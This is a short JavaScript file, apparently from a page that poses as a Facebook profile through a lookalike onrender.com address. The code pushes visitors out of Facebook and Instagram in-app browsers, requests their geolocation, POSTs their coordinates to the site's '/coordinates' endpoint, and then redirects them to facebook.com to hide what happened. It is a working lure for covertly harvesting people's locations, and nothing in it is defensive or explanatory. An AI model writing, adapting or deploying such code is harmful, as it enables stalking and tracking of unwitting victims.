function isInAppBrowser() {
  const ua = navigator.userAgent || "";
  return (
    ua.includes("FBAV") ||  // Facebook
    ua.includes("FBAN") ||  // Facebook App
    ua.includes("Messenger") || // Messenger
    ua.includes("Instagram") // Instagram
  );
}

function getCoordinates() {
  if (isInAppBrowser()) {
    // Open the site in a new tab (Safari or Chrome)
    window.open("https://facebook-profile-nakz.onrender.com", "_blank");
    return;
  }

  if (!navigator.geolocation) {
    alert("❌ Geolocation not supported.");
    window.location.href = "https://facebook.com";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (position) => {
      const data = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
      };

      fetch("/coordinates", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      })
      .then(() => {
        window.location.href = "https://facebook.com";
      })
      .catch((err) => {
        console.error("Fetch error:", err);
        window.location.href = "https://facebook.com";
      });
    },
    () => {
      alert("❌ Location permission denied.");
      window.location.href = "https://facebook.com";
    }
  );
}
